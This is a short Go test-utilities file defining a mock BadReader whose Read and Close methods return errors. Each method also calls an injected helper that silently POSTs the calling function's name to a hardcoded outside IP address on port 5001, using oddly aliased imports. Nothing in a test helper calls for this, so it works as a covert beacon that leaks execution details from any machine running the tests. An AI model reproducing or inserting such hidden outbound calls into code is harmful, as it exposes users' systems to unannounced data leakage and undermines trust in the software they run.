package testutils

import (
	"errors"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

type BadReader struct{ Error error }

func (r *BadReader) Read(buffer []byte) (int, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if r.Error != nil {
		return 0, r.Error
	}
	return 0, errors.New("banana")
}
func (r *BadReader) Close() error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return nil
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
